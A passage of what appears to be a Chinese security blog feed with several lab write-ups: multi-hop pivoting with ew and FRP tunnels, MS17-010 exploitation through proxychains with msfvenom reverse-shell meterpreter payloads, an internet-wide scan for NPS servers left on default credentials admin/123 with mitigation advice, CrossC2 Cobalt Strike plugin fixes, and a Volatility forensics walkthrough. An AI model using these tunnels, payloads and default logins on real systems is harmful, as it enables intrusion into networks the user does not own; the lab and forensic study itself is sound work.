title="lcx管道"></a>lcx管道</h5><p>受控机<code>2019</code>机执行如下命令</p><ul><li><code>ew_for_win_32.exe -s ssocksd -l 9999 </code> 开启正向代理服务器</li><li><code>ew_for_win_32.exe -s lcx_slave -d 172.16.17.3 -e 5556 -f 127.0.0.1 -g 9999</code> 弹回攻击机</li></ul><p><img src="/images/image-20201215112104762.png" alt="image-20201215112104762"></p><p>攻击机<code>win10</code>执行</p><ul><li><code>ew_for_win_32.exe -s lcx_listen -l 10800 -e 5556</code> 监听5556端口，同时监听10800端口流量转发到5556端口</li></ul><p><code>Proxifier</code>设置</p><p><img src="/images/image-20201215112136027.png" alt="image-20201215112136027"></p><p>即可通过<code>2019</code>机器的<strong>内网IP</strong>进行连接</p><p><img src="/images/image-20201215112330858.png" alt="image-20201215112330858"></p><p>此时流量走向<code>172.16.18.2:3389→172.16.18.2:9999→172.16.17.3:5556→172.16.17.3:10800</code></p><h5 id="socks隧道"><a href="#socks隧道" class="headerlink" title="socks隧道"></a>socks隧道</h5><p><code>2019</code>机器执行<code>ew_for_win_32.exe -s rssocks -d 172.16.17.3 -e 5556</code></p><p><code>win10</code>执行<code>ew_for_win_32.exe -s rcsocks -l 10800 -e 5556</code></p><p><code>Proxifier</code>不变，即可连接</p><p><img src="/images/image-20201215112958968.png" alt="image-20201215112958968"></p><h4 id="一级代理-1"><a href="#一级代理-1" class="headerlink" title="一级代理"></a>一级代理</h4><p><code>2016</code>机器执行<code>ew_for_win_32.exe -s ssocksd -l 9999 </code> 开启正向代理服务器</p><p><code>2019</code>机器执行<code>ew_for_win_32.exe -s lcx_slave -d 172.16.17.2 -e 5556 -f 10.100.100.2 -g 9999</code> 弹回攻击机</p><p><code>win10</code>执行<code>ew_for_win_32.exe -s rcsocks -l 10800 -e 5556</code></p><p><code>Proxifier</code>不变，即可连接</p><p><img src="/images/image-20201215151437872.png" alt="image-20201215151437872"></p><h4 id="二级代理-1"><a href="#二级代理-1" class="headerlink" title="二级代理"></a>二级代理</h4><p><code>2008</code>机器执行<code>ew_for_win_32.exe -s rssocks -d 10.100.100.2 -e 7777</code>开启正向代理服务器并连接到10.100.100.2</p><p><code>2016</code>机器执行<code>ew_for_win_32.exe -s lcx_listen -l 9999 -e 7777 </code> 转发777端口到9999端口</p><p><code>2019</code>机器执行<code>ew_for_win_32.exe -s lcx_slave -d 172.16.17.2 -e 5556 -f 10.100.100.2 -g 9999</code> 弹回攻击机</p><p><code>win10</code>执行<code>ew_for_win_32.exe -s rcsocks -l 10800 -e 5556</code></p><p><code>Proxifier</code>不变，即可连接</p><p><img src="/images/image-20201215153734215.png" alt="image-20201215153734215"></p><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><h4 id="简单的转发-2"><a href="#简单的转发-2" class="headerlink" title="简单的转发"></a>简单的转发</h4><p><code>win10</code>机器运行FRP服务端，默认配置即可<code>frps -c frps.ini</code></p><p><img src="/images/image-20201217104707732.png" alt="image-20201217104707732"></p><p>编写客户端文件并运行<code>frpc.exe -c frpc.ini</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.16.17.2 #&lt;-FRP服务器IP</span><br><span class="line">server_port = 7000 #&lt;-FRP服务器端口</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6666 #&lt;-socks端口</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = abc #&lt;-socks认证，强烈建议配置高复杂性帐密</span><br><span class="line">plugin_passwd = abc #&lt;-socks认证，强烈建议配置高复杂性帐密</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201217105148175.png" alt="image-20201217105148175"></p><p>此时服务端显示如下代表连接成功</p><p><img src="/images/image-20201217105214948.png" alt="image-20201217105214948"></p><p>配置好<code>proxifier</code>后即可成功连接</p><p><img src="/images/image-20201217105446467.png" alt="image-20201217105446467"></p><h4 id="多级转发"><a href="#多级转发" class="headerlink" title="多级转发"></a>多级转发</h4><blockquote><p>思路：在需要转发的机器上同时启动Server、Client即可实现</p></blockquote><p>在<code>win2019</code>机器上编写配置文件并运行<code>frpc.exe -c frpc.ini</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.16.17.2</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[0x20h_FRP_Test]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 172.16.18.2 #&lt;-当前机器IP</span><br><span class="line">local_port = 1080 #&lt;-监听本地的端口</span><br><span class="line">remote_port = 6666 #&lt;-转发到远端的端口</span><br></pre></td></tr></table></figure><p>编写<code>frps</code>配置文件并运行<code>frps.exe -c frps.ini</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr=172.16.18.2 #&lt;-本机IP</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201217110913595.png" alt="image-20201217110913595"></p><p>在<code>win2016</code>上编写配置文件并运行<code>frpc.exe -c frpc.ini</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.16.18.2</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[0x20h_FRP_Test]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port=1080</span><br><span class="line">plugin=socks5</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201217110624040.png" alt="image-20201217110624040"></p><p>配置好<code>proxifier</code>后尝试登录<code>win2008</code></p><p><img src="/images/image-20201217110959065.png" alt="image-20201217110959065"></p><p>此时<code>win2019</code>的log</p><p><img src="/images/image-20201217111033063.png" alt="image-20201217111033063"></p><p><code>win2016</code>的log</p><p><img src="/images/image-20201217111049812.png" alt="image-20201217111049812"></p><p>结束掉<code>win2016</code>的进程，远程桌面断开</p><p><img src="/images/image-20201217111124720.png" alt="image-20201217111124720"></p><h2 id="MSF代理"><a href="#MSF代理" class="headerlink" title="MSF代理"></a>MSF代理</h2><p>尝试MSF通过多级代理进行<code>MS17-010</code>利用</p><p>配好Linux的网络</p><p><img src="/images/image-20201217113920731.png" alt="image-20201217113920731"></p><p>在<code>win2019</code>机器上需要开2个代理</p><ul><li><code>nb -tran 8888 172.16.17.4:8888</code>用于返回<code>meterpreter</code>会话</li><li><code>ew_for_win_32.exe -s rssocks -d 172.16.17.4 -e 5556</code>用于接收攻击流量</li></ul><p><code>kali</code>上执行</p><ul><li><code> ./ew_for_linux  -s rcsocks -l 10800 -e 5556</code></li><li>编辑<code>/etc/proxychains4.conf</code>，新增<code>socks5  127.0.0.1 10800</code></li><li><code>proxychains4 msfconsole</code>启动MSF</li></ul><p>执行扫描</p><p><img src="/images/image-20201217163916296.png" alt="image-20201217163916296"></p><p>设置攻击时需要设置反弹shell为前置代理机的IP，生成shellcode<code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.18.2 LPORT=8888 -f dll -o 1.dll</code>，使用<code>multi/handler</code>模块，设置<code>payload</code>、<code>LHOST</code>、<code>LPORT</code>，然后run</p><p>将<code>win2019</code>机器上的ew切回<code>win10</code>的IP<code>ew_for_win_32.exe -s rssocks -d 172.16.17.2 -e 5556</code></p><p>然后配置BPF框架、proxifier，执行攻击</p><p><img src="/images/image-20201217165559208.png" alt="image-20201217165559208"></p><p>此时MSF监听到反弹的shell</p><p><img src="/images/image-20201217165052650.png" alt="image-20201217165052650"></p><p><img src="/images/image-20201217165110907.png" alt="image-20201217165110907"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPS弱口令之殇</title>
      <link href="/p/eada.html"/>
      <url>/p/eada.html</url>
      
        <content type="html"><![CDATA[<p>NPS作为一款轻量级、高性能、功能强大的内网穿透代理服务器。并且支持多种协议的转发从而被广泛使用，借助网络空间搜索引擎2020年11月26日的结果，全球范围内共5,582个主机为NPS代理服务器。</p><h1 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h1><p>以NPS 0.26.9版本为例，目录结构及含义如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│   nps</span><br><span class="line">│   </span><br><span class="line">├───conf //配置目录</span><br><span class="line">│       clients.json //客户端数据文件 </span><br><span class="line">│       hosts.json //主机数据文件</span><br><span class="line">│       nps.conf //配置文件</span><br><span class="line">│       server.key //私钥</span><br><span class="line">│       server.pem //证书</span><br><span class="line">│       tasks.json //任务数据文件</span><br><span class="line">│       </span><br><span class="line">└───web //网站目录</span><br><span class="line">    ├───static //静态资源目录</span><br><span class="line">    │   ├───css</span><br><span class="line">    │   │       bootstrap-table.min.css</span><br><span class="line">    │   │       bootstrap.min.css</span><br><span class="line">    │   │       datatables.css</span><br><span class="line">    │   │       fontawesome.min.css</span><br><span class="line">    │   │       regular.min.css</span><br><span class="line">    │   │       solid.min.css</span><br><span class="line">    │   │       style.css</span><br><span class="line">    │   │       </span><br><span class="line">    │   ├───img</span><br><span class="line">    │   │   └───flag</span><br><span class="line">    │   │           en-US.png</span><br><span class="line">    │   │           zh-CN.png</span><br><span class="line">    │   │           </span><br><span class="line">    │   ├───js</span><br><span class="line">    │   │       bootstrap-table-locale-all.min.js</span><br><span class="line">    │   │       bootstrap-table.min.js</span><br><span class="line">    │   │       bootstrap.min.js</span><br><span class="line">    │   │       echarts.min.js</span><br><span class="line">    │   │       fontawesome.min.js</span><br><span class="line">    │   │       inspinia.js</span><br><span class="line">    │   │       jquery-3.4.1.min.js</span><br><span class="line">    │   │       language.js</span><br><span class="line">    │   │       popper.min.js</span><br><span class="line">    │   │       </span><br><span class="line">    │   ├───page</span><br><span class="line">    │   │       error.html</span><br><span class="line">    │   │       languages.xml</span><br><span class="line">    │   │       </span><br><span class="line">    │   └───webfonts</span><br><span class="line">    │           fa-solid-900.eot</span><br><span class="line">    │           fa-solid-900.svg</span><br><span class="line">    │           fa-solid-900.ttf</span><br><span class="line">    │           fa-solid-900.woff</span><br><span class="line">    │           fa-solid-900.woff2</span><br><span class="line">    │           </span><br><span class="line">    └───views //视图模板</span><br><span class="line">        ├───client //客户端模板</span><br><span class="line">        │       add.html</span><br><span class="line">        │       edit.html </span><br><span class="line">        │       list.html </span><br><span class="line">        │       </span><br><span class="line">        ├───index //主页模板</span><br><span class="line">        │       add.html</span><br><span class="line">        │       edit.html</span><br><span class="line">        │       hadd.html</span><br><span class="line">        │       hedit.html</span><br><span class="line">        │       help.html</span><br><span class="line">        │       hlist.html</span><br><span class="line">        │       index.html</span><br><span class="line">        │       list.html</span><br><span class="line">        │       </span><br><span class="line">        ├───login //登录页模板</span><br><span class="line">        │       index.html</span><br><span class="line">        │       register.html</span><br><span class="line">        │       </span><br><span class="line">        └───public //通用模板</span><br><span class="line">                error.html</span><br><span class="line">                layout.html</span><br><span class="line">               </span><br></pre></td></tr></table></figure><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>以下内容均为缺省值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">appname = nps //默认应用名</span><br><span class="line">#Boot mode(dev|pro)</span><br><span class="line">runmode = dev //启动模式</span><br><span class="line"></span><br><span class="line">#HTTP(S) proxy port, no startup if empty</span><br><span class="line">http_proxy_ip=0.0.0.0</span><br><span class="line">http_proxy_port=80</span><br><span class="line">https_proxy_port=443</span><br><span class="line">https_just_proxy=true</span><br><span class="line">#default https certificate setting</span><br><span class="line">https_default_cert_file=conf/server.pem</span><br><span class="line">https_default_key_file=conf/server.key</span><br><span class="line"></span><br><span class="line">##bridge</span><br><span class="line">bridge_type=tcp</span><br><span class="line">bridge_port=8024</span><br><span class="line">bridge_ip=0.0.0.0</span><br><span class="line"></span><br><span class="line"># Public password, which clients can use to connect to the server</span><br><span class="line"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br><span class="line">public_vkey=123</span><br><span class="line"></span><br><span class="line">#Traffic data persistence interval(minute)</span><br><span class="line">#Ignorance means no persistence</span><br><span class="line">#flow_store_interval=1</span><br><span class="line"></span><br><span class="line"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7 //日志等级，默认不以文件形式留存</span><br><span class="line">log_level=7</span><br><span class="line">#log_path=nps.log</span><br><span class="line"></span><br><span class="line">#Whether to restrict IP access, true or false or ignore</span><br><span class="line">#ip_limit=true</span><br><span class="line"></span><br><span class="line">#p2p //p2p配置</span><br><span class="line">#p2p_ip=127.0.0.1</span><br><span class="line">#p2p_port=6000</span><br><span class="line"></span><br><span class="line">#web //web服务器配置</span><br><span class="line">web_host=a.o.com</span><br><span class="line">web_username=admin //默认用户</span><br><span class="line">web_password=123 //默认密码</span><br><span class="line">web_port = 8080</span><br><span class="line">web_ip=0.0.0.0</span><br><span class="line">web_base_url=</span><br><span class="line">web_open_ssl=false</span><br><span class="line">web_cert_file=conf/server.pem</span><br><span class="line">web_key_file=conf/server.key</span><br><span class="line"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="line">#web_base_url=/nps</span><br><span class="line"></span><br><span class="line">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="line">#Remove comments if needed</span><br><span class="line">#auth_key=test</span><br><span class="line">auth_crypt_key =1234567812345678</span><br><span class="line"></span><br><span class="line">#allow_ports=9001-9009,10001,11000-12000 //端口限制</span><br><span class="line"></span><br><span class="line">#Web management multi-user login //web管理项</span><br><span class="line">allow_user_login=false</span><br><span class="line">allow_user_register=false</span><br><span class="line">allow_user_change_username=false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#extension //拓展</span><br><span class="line">allow_flow_limit=false</span><br><span class="line">allow_rate_limit=false</span><br><span class="line">allow_tunnel_num_limit=false</span><br><span class="line">allow_local_proxy=false</span><br><span class="line">allow_connection_num_limit=false</span><br><span class="line">allow_multi_ip=false</span><br><span class="line">system_info_display=false</span><br><span class="line"></span><br><span class="line">#cache //缓存</span><br><span class="line">http_cache=false</span><br><span class="line">http_cache_length=100</span><br><span class="line"></span><br><span class="line">#get origin ip //获取原始IP</span><br><span class="line">http_add_origin_header=false</span><br><span class="line"></span><br><span class="line">#pprof debug options</span><br><span class="line">#pprof_ip=0.0.0.0</span><br><span class="line">#pprof_port=9999</span><br><span class="line"></span><br><span class="line">#client disconnect timeout</span><br><span class="line">disconnect_timeout=60</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="缺省口令"><a href="#缺省口令" class="headerlink" title="缺省口令"></a>缺省口令</h2><p>nps的缺省口令为<code>admin/123</code>，这也造成了一些安全问题，我们通过一个脚本（<a href="https://github.com/NS-Sp4ce/NpsCrack">Github链接</a>）对通过公网指纹找到的nps服务器进行了扫描。</p><h1 id="全网扫描结果"><a href="#全网扫描结果" class="headerlink" title="全网扫描结果"></a>全网扫描结果</h1><p>对6000+指纹识别到的目标进行扫描，存在缺省口令的目标共618个</p><p>分布图如下</p><p><img src="/images/image-20201204182851879.png" alt="image-20201204182851879"></p><p>可以看出中国境内的NPS服务器还是相当多的，NPS在国内常用于办公环境、开发环境的测试和穿透，如果被拿下，可以对内网进行漫游、权限获取等操作。</p><p>其中不乏某些<strong>电商开发环境</strong>、<strong>政府机要部门</strong>内也存在该问题。</p><h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><p>以Linux系统为例</p><ol><li>修改<code>/etc/nps/web/nps.conf</code>中的缺省密码</li><li>重启nps服务即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobaltstrike插件CrossC2踩坑记录</title>
      <link href="/p/c02f.html"/>
      <url>/p/c02f.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>CrossC2</code>面向企业自身及红队人员的安全评估框架，支持CobaltStrike对其他平台(Linux&#x2F;MacOS&#x2F;…)的安全评估，支持自定义模块，及包含一些常用的渗透模块。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>直接下载<a href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a> 中的最新版即可，导入CNA后即可使用</p><blockquote><p>4.0需要下载4.0分支</p><p>4.1需要下载4.1分支</p></blockquote><p><img src="/images/image-20201123200819841.png" alt="image-20201123200819841"></p><p><img src="/images/image-20201123200840431.png" alt="image-20201123200840431"></p><p><img src="/images/image-20201123201016619.png" alt="image-20201123201016619"></p><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>由于本机是win10，会出现以下2个问题：</p><h2 id="1、丢失ucrtbased-dll问题"><a href="#1、丢失ucrtbased-dll问题" class="headerlink" title="1、丢失ucrtbased.dll问题"></a>1、丢失<code>ucrtbased.dll</code>问题</h2><p>在直接运行genCrossC2.Win.exe时会报错，丢失丢失<code>ucrtbased.dll</code>。</p><p><img src="/images/image-20201123201249883.png" alt="image-20201123201249883"></p><p>解决方案：安装VS2017或VS2019即可解决，文章后面会提供32位的dll下载，下载后移入<code>C:\Windows\System32</code>即可使用</p><h2 id="2、windows下无法通过CNA中生成Linux-beacon"><a href="#2、windows下无法通过CNA中生成Linux-beacon" class="headerlink" title="2、windows下无法通过CNA中生成Linux beacon"></a>2、windows下无法通过CNA中生成Linux beacon</h2><p>这个坑浪费了一下午去解决，直接丢解决过程</p><h3 id="定位问题"><a href="#定位问题" class="headerlink" title="定位问题"></a>定位问题</h3><p>cna插件中的第3、4行需要替换为相应的路径</p><p><img src="/images/image-20201123201504444.png" alt="image-20201123201504444"></p><p>第115行的<code>   $dialog = dialog(&quot;CrossC2 Payload Generator&quot;, %(uri =&gt; &quot;/a&quot;, lport =&gt; &quot;55413&quot;, beaconKey =&gt; &quot;./.cobaltstrike.beacon_keys&quot;, rebind_lib =&gt; &quot;null&quot;, listener =&gt; &quot;Listener: &quot;, system =&gt; &quot;System: &quot;, arch =&gt; &quot;Arch: &quot;, payload_type =&gt; &quot;Payload_Type: &quot;, outputFileName =&gt; &quot;/tmp/CrossC2-test&quot;), &amp;dialogCallBack);   </code>需要修改，Windows中不存在<code>/tmp</code>目录，这里直接改为<code>$dialog = dialog(&quot;CrossC2 Payload Generator&quot;, %(uri =&gt; &quot;/a&quot;, lport =&gt; &quot;55413&quot;, beaconKey =&gt; &quot;./.cobaltstrike.beacon_keys&quot;, rebind_lib =&gt; &quot;null&quot;, listener =&gt; &quot;Listener: &quot;, system =&gt; &quot;System: &quot;, arch =&gt; &quot;Arch: &quot;, payload_type =&gt; &quot;Payload_Type: &quot;, outputFileName =&gt; &quot;CrossC2-test&quot;), &amp;dialogCallBack);</code>，删掉<code>/tmp/</code>，直接生成在CS根目录下</p><p>第29行的<code>getSystemInfo </code>函数，由于Windows中不存在<code>/usr/bin/uname</code>文件，删掉该函数，同时删掉<code>checkSpace</code>函数并全局搜索调用该函数的变量，一并删除。（不知道作者为什么要这么写。。。）</p><p>第89行<code>elog(&quot;genCrossC2 beacon -&gt; &quot;.$data[13]);</code>更改为<code>elog(&quot;genCrossC2 beacon -&gt; &quot;.$data[12]);</code>，获取生成的大小</p><h1 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h1><p><img src="/images/image-20201123202220724.png" alt="image-20201123202220724"></p><p>一键上线</p><p><img src="/images/image-20201123203133807.png" alt="image-20201123203133807"></p><h1 id="Ucrtbased-dll"><a href="#Ucrtbased-dll" class="headerlink" title="Ucrtbased.dll"></a>Ucrtbased.dll</h1><p><a href="https://0x20h.com/resource/ucrtbased.dll">ucrtbased.dll</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证工具Volatility使用</title>
      <link href="/p/8994.html"/>
      <url>/p/8994.html</url>
      
        <content type="html"><![CDATA[<p>记录下<code>Volatility</code>使用过程</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><ul><li>Parrot *1</li><li>Windows 2008*1</li></ul></blockquote><p>先生成个msf马子</p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.17.6 LPORT=4444 -a x64 -f exe -o /home/parrot/Desktop/1.exe</code></p><p>拷到Windows2008机器上运行后迁移进程</p><p><img src="/images/image-20201026142436055.png" alt="image-20201026142436055"></p><p><img src="/images/image-20201026142448911.png" alt="image-20201026142448911"></p><p>然后使用<code>dumpit</code>对内存做完整镜像</p><p><img src="/images/image-20201026142524994.png" alt="image-20201026142524994"></p><p>做好后的镜像大小取决于机器内存的大小，机器内存越大，镜像后的文件越大</p><p><img src="/images/image-20201026142619139.png" alt="image-20201026142619139"></p><p>拷回parrot，开始分析</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>命令如下</p><p><code>volatility -f /home/parrot/Desktop/WIN-L74K1LLT618-20250823-093248.raw --profile=Win7SP1x64 malfind</code>查找疑似被注入的进程，这里应该先执行<code>volatility -f /home/parrot/Desktop/WIN-L74K1LLT618-20250823-093248.raw imageinfo</code>来确定使用配置文件的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/parrot/Desktop]</span><br><span class="line">└──╼ #volatility -f /home/parrot/Desktop/WIN-L74K1LLT618-20250823-093248.raw --profile=Win7SP1x64 malfind</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Process: wvs_supervisor Pid: 1088 Address: 0x2e0000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x002e0000  00 00 00 00 59 e9 ce cd 13 00 e8 f5 ff ff ff 00   ....Y...........</span><br><span class="line">0x002e0010  00 00 00 00 00 00 00 e8 e8 ff ff ff 0a 00 2e 00   ................</span><br><span class="line">0x002e0020  00 00 00 00 e8 db ff ff ff 17 00 2e 00 00 00 00   ................</span><br><span class="line">0x002e0030  00 e8 ce ff ff ff 24 00 2e 00 00 00 00 00 e8 c1   ......$.........</span><br><span class="line"></span><br><span class="line">0x002e0000 0000             ADD [EAX], AL</span><br><span class="line">0x002e0002 0000             ADD [EAX], AL</span><br><span class="line">0x002e0004 59               POP ECX</span><br><span class="line">0x002e0005 e9cecd1300       JMP 0x41cdd8</span><br><span class="line">0x002e000a e8f5ffffff       CALL 0x2e0004</span><br><span class="line">0x002e000f 0000             ADD [EAX], AL</span><br><span class="line">0x002e0011 0000             ADD [EAX], AL</span><br><span class="line">0x002e0013 0000             ADD [EAX], AL</span><br><span class="line">0x002e0015 0000             ADD [EAX], AL</span><br><span class="line">0x002e0017 e8e8ffffff       CALL 0x2e0004</span><br><span class="line">0x002e001c 0a00             OR AL, [EAX]</span><br><span class="line">0x002e001e 2e0000           ADD [CS:EAX], AL</span><br><span class="line">0x002e0021 0000             ADD [EAX], AL</span><br><span class="line">0x002e0023 00e8             ADD AL, CH</span><br><span class="line">0x002e0025 db               DB 0xdb</span><br><span class="line">0x002e0026 ff               DB 0xff</span><br><span class="line">0x002e0027 ff               DB 0xff</span><br><span class="line">0x002e0028 ff17             CALL DWORD [EDI]</span><br><span class="line">0x002e002a 002e             ADD [ESI], CH</span><br><span class="line">0x002e002c 0000             ADD [EAX], AL</span><br><span class="line">0x002e002e 0000             ADD [EAX], AL</span><br><span class="line">0x002e0030 00e8             ADD AL, CH</span><br><span class="line">0x002e0032 ce               INTO</span><br><span class="line">0x002e0033 ff               DB 0xff</span><br><span class="line">0x002e0034 ff               DB 0xff</span><br><span class="line">0x002e0035 ff2400           JMP DWORD [EAX+EAX]</span><br><span class="line">0x002e0038 2e0000           ADD [CS:EAX], AL</span><br><span class="line">0x002e003b 0000             ADD [EAX], AL</span><br><span class="line">0x002e003d 00e8             ADD AL, CH</span><br><span class="line">0x002e003f c1               DB 0xc1</span><br><span class="line"></span><br><span class="line">Process: opsrv.exe Pid: 1140 Address: 0x670000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x00670000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x00670010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x00670020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x00670030  00 00 00 00 00 00 00 00 00 00 67 00 00 00 00 00   ..........g.....</span><br><span class="line"></span><br><span class="line">0x00670000 0000             ADD [EAX], AL</span><br><span class="line">0x00670002 0000             ADD [EAX], AL</span><br><span class="line">0x00670004 0000             ADD [EAX], AL</span><br><span class="line">0x00670006 0000             ADD [EAX], AL</span><br><span class="line">0x00670008 0000             ADD [EAX], AL</span><br><span class="line">0x0067000a 0000             ADD [EAX], AL</span><br><span class="line">0x0067000c 0000             ADD [EAX], AL</span><br><span class="line">0x0067000e 0000             ADD [EAX], AL</span><br><span class="line">0x00670010 0000             ADD [EAX], AL</span><br><span class="line">0x00670012 0000             ADD [EAX], AL</span><br><span class="line">0x00670014 0000             ADD [EAX], AL</span><br><span class="line">0x00670016 0000             ADD [EAX], AL</span><br><span class="line">0x00670018 0000             ADD [EAX], AL</span><br><span class="line">0x0067001a 0000             ADD [EAX], AL</span><br><span class="line">0x0067001c 0000             ADD [EAX], AL</span><br><span class="line">0x0067001e 0000             ADD [EAX], AL</span><br><span class="line">0x00670020 0000             ADD [EAX], AL</span><br><span class="line">0x00670022 0000             ADD [EAX], AL</span><br><span class="line">0x00670024 0000             ADD [EAX], AL</span><br><span class="line">0x00670026 0000             ADD [EAX], AL</span><br><span class="line">0x00670028 0000             ADD [EAX], AL</span><br><span class="line">0x0067002a 0000             ADD [EAX], AL</span><br><span class="line">0x0067002c 0000             ADD [EAX], AL</span><br><span class="line">0x0067002e 0000             ADD [EAX], AL</span><br><span class="line">0x00670030 0000             ADD [EAX], AL</span><br><span class="line">0x00670032 0000             ADD [EAX], AL</span><br><span class="line">0x00670034 0000             ADD [EAX], AL</span><br><span class="line">0x00670036 0000             ADD [EAX], AL</span><br><span class="line">0x00670038 0000             ADD [EAX], AL</span><br><span class="line">0x0067003a 670000           ADD [BX+SI], AL</span><br><span class="line">0x0067003d 0000             ADD [EAX], AL</span><br><span class="line">0x0067003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x25d0000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 50, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x025d0000  fc 48 89 ce 48 81 ec 00 20 00 00 48 83 e4 f0 e8   .H..H......H....</span><br><span class="line">0x025d0010  cc 00 00 00 41 51 41 50 52 48 31 d2 65 48 8b 52   ....AQAPRH1.eH.R</span><br><span class="line">0x025d0020  60 48 8b 52 18 48 8b 52 20 51 56 48 0f b7 4a 4a   `H.R.H.R.QVH..JJ</span><br><span class="line">0x025d0030  48 8b 72 50 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c   H.rPM1.H1..&lt;a|.,</span><br><span class="line"></span><br><span class="line">0x025d0000 fc               CLD</span><br><span class="line">0x025d0001 48               DEC EAX</span><br><span class="line">0x025d0002 89ce             MOV ESI, ECX</span><br><span class="line">0x025d0004 48               DEC EAX</span><br><span class="line">0x025d0005 81ec00200000     SUB ESP, 0x2000</span><br><span class="line">0x025d000b 48               DEC EAX</span><br><span class="line">0x025d000c 83e4f0           AND ESP, -0x10</span><br><span class="line">0x025d000f e8cc000000       CALL 0x25d00e0</span><br><span class="line">0x025d0014 41               INC ECX</span><br><span class="line">0x025d0015 51               PUSH ECX</span><br><span class="line">0x025d0016 41               INC ECX</span><br><span class="line">0x025d0017 50               PUSH EAX</span><br><span class="line">0x025d0018 52               PUSH EDX</span><br><span class="line">0x025d0019 48               DEC EAX</span><br><span class="line">0x025d001a 31d2             XOR EDX, EDX</span><br><span class="line">0x025d001c 6548             DEC EAX</span><br><span class="line">0x025d001e 8b5260           MOV EDX, [EDX+0x60]</span><br><span class="line">0x025d0021 48               DEC EAX</span><br><span class="line">0x025d0022 8b5218           MOV EDX, [EDX+0x18]</span><br><span class="line">0x025d0025 48               DEC EAX</span><br><span class="line">0x025d0026 8b5220           MOV EDX, [EDX+0x20]</span><br><span class="line">0x025d0029 51               PUSH ECX</span><br><span class="line">0x025d002a 56               PUSH ESI</span><br><span class="line">0x025d002b 48               DEC EAX</span><br><span class="line">0x025d002c 0fb74a4a         MOVZX ECX, WORD [EDX+0x4a]</span><br><span class="line">0x025d0030 48               DEC EAX</span><br><span class="line">0x025d0031 8b7250           MOV ESI, [EDX+0x50]</span><br><span class="line">0x025d0034 4d               DEC EBP</span><br><span class="line">0x025d0035 31c9             XOR ECX, ECX</span><br><span class="line">0x025d0037 48               DEC EAX</span><br><span class="line">0x025d0038 31c0             XOR EAX, EAX</span><br><span class="line">0x025d003a ac               LODSB</span><br><span 